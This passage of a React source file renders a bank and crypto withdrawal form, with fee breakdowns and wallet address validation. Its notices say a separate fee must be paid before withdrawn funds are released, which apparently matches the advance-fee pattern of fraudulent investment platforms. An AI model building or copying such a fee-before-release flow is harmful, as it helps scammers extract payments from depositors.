                    style={sharedInput} onFocus={onFocus} onBlur={onBlur}
                  />
                  <FeeBreakdown amount={bankAmount} />
                  <FeeTierBadges currentAmount={bankAmount} />
                </div>
                <div>
                  <label style={fieldLabel}>Bank Name</label>
                  <input type="text" value={bankName} onChange={e => setBankName(e.target.value)}
                    placeholder="Enter bank name" required style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                </div>
                <div>
                  <label style={fieldLabel}>Account Number</label>
                  <input type="text" value={accountNumber} onChange={e => setAccountNumber(e.target.value)}
                    placeholder="Enter account number" required style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                </div>
                <div style={{
                  display: "flex", gap: "10px", alignItems: "flex-start",
                  padding: "12px 14px", background: "rgba(255,255,255,0.02)",
                  border: "1px solid rgba(255,255,255,0.07)", borderRadius: "12px",
                }}>
                  <AlertCircle size={13} color="#fbbf24" style={{ marginTop: "1px", flexShrink: 0 }} />
                  <span style={{ fontSize: "11px", color: "#4b5563", lineHeight: 1.6 }}>
                    Bank withdrawals process within 1–3 business days. A separate fee payment is required before funds are released.
                  </span>
                </div>
                <button type="submit" disabled={!bankCanProceed} className="theme-cta w-full justify-center" style={{ opacity: bankCanProceed ? 1 : 0.55 }}>
                  REVIEW WITHDRAWAL <ChevronRight size={14} />
                </button>
              </form>
            )}

            {/* ── Crypto Form ── */}
            {method === "crypto" && (
              <form onSubmit={handleProceed} className="flex flex-col gap-4">
                <div className="flex flex-col gap-3 sm:flex-row">
                  <div style={{ flex: 1 }}>
                    <label style={fieldLabel}>Coin</label>
                    <select value={coin} onChange={handleCoinChange} required className="theme-select theme-input"
                      onFocus={onFocus} onBlur={onBlur} disabled={availableCryptoCoins.length === 0}>
                      <option value="" disabled>
                        {availableCryptoCoins.length > 0 ? "Select coin" : "No crypto assets"}
                      </option>
                      {availableCryptoCoins.map(c => (
                        <option key={c.value} value={c.value}>{c.label} ({c.value})</option>
                      ))}
                    </select>
                  </div>
                  <div style={{ flex: 1 }}>
                    <label style={fieldLabel}>Network</label>
                    <select
                      value={network} onChange={handleNetworkChange}
                      disabled={!coin} required
                      className="theme-select theme-input"
                      style={{ opacity: !coin ? 0.4 : 1, cursor: !coin ? "not-allowed" : "pointer" }}
                      onFocus={onFocus} onBlur={onBlur}
                    >
                      <option value="" disabled>Select network</option>
                      {getNetworks(coin).map(net => (
                        <option key={net.value} value={net.value}>{net.label}</option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Selected network pill */}
                {network && (
                  <div style={{ display: "flex", alignItems: "center", gap: "6px", marginTop: "-10px" }}>
                    <div style={{
                      width: "6px", height: "6px", borderRadius: "50%",
                      background: "#4ade80", boxShadow: "0 0 6px #4ade80",
                    }} />
                    <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "10px", color: "#4ade80", letterSpacing: "0.08em" }}>
                      {getNetworks(coin).find(n => n.value === network)?.label ?? network}
                    </span>
                  </div>
                )}

                <div>
                  <label style={fieldLabel}>Amount (USD equivalent)</label>
                  <input type="number" value={cryptoAmount} onChange={e => setCryptoAmount(e.target.value)}
                    placeholder="0.00" min="0" step="any" required
                    style={sharedInput} onFocus={onFocus} onBlur={onBlur} />
                  <FeeBreakdown amount={cryptoAmount} />
                  <FeeTierBadges currentAmount={cryptoAmount} />
                </div>

                <div>
                  <label style={fieldLabel}>
                    {coin ? `${coin} Wallet Address` : "Wallet Address"}
                  </label>
                  <input
                    type="text" value={walletAddress}
                    onChange={e => { setWalletAddress(e.target.value); }}
                    onBlur={e => { setWalletTouched(true); onBlur(e); }}
                    onFocus={onFocus}
                    placeholder={
                      !coin ? "Select a coin first" :
                      network === "ERC20" || network === "BEP20" ? "0x..." :
                      network === "TRC20" ? "T..." :
                      coin === "BTC" ? "1... / 3... / bc1..." :
                      `Enter ${coin} wallet address`
                    }
                    disabled={!coin || !network}
                    required
                    className={`theme-input ${walletTouched && walletAddress ? (addrValidation?.valid ? 'addr-ok' : 'addr-error') : ''}`}
                    style={{
                      opacity: (!coin || !network) ? 0.45 : 1,
                      cursor: (!coin || !network) ? "not-allowed" : "text",
                    }}
                  />
                  {/* Inline validation message */}
                  {walletTouched && walletAddress && addrValidation && (
                    <div style={{
                      display: "flex", gap: "6px", alignItems: "center",
                      marginTop: "6px", padding: "7px 10px", borderRadius: "8px",
                      background: addrValidation.valid ? "rgba(74,222,128,0.05)" : "rgba(239,68,68,0.06)",
                      border: `1px solid ${addrValidation.valid ? "rgba(74,222,128,0.15)" : "rgba(239,68,68,0.15)"}`,
                    }}>
                      {addrValidation.valid
                        ? <CheckCircle2 size={11} color="#4ade80" />
                        : <AlertCircle  size={11} color="#ef4444" />
                      }
                      <span className={`font-mono text-[10px] tracking-[0.04em] ${addrValidation.valid ? 'text-success' : 'text-danger'}`}>
                        {addrValidation.valid ? `Valid ${coin} address` : addrValidation.message}
                      </span>
                    </div>
                  )}
                </div>

                <div className="theme-panel-error">
                  <div className="flex items-start gap-2">
                    <AlertCircle size={13} color="#ef4444" className="mt-0.5 flex-shrink-0" />
                    <span className="text-[11px] text-slate-400 leading-6">
                      Double-check your wallet address and network. Funds sent to a wrong address cannot be recovered.
                    </span>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={!cryptoCanProceed}
                  className="theme-cta w-full justify-center"
                  style={{ opacity: cryptoCanProceed ? 1 : 0.55 }}
                >
                  REVIEW WITHDRAWAL <ChevronRight size={14} />
                </button>
              </form>
            )}
          </div>

          {/* Footer */}
          <div style={{ marginTop: "16px", display: "flex", justifyContent: "center", alignItems: "center", gap: "6px" }}>
            <TrendingUp size={11} color="#374151" />
            <span style={{ fontSize: "11px", color: "#374151", letterSpacing: "0.04em" }}>
              Secure withdrawals · Fee paid separately before release
            </span>
          </div>
        </div>
      </main>
    </>
  );
}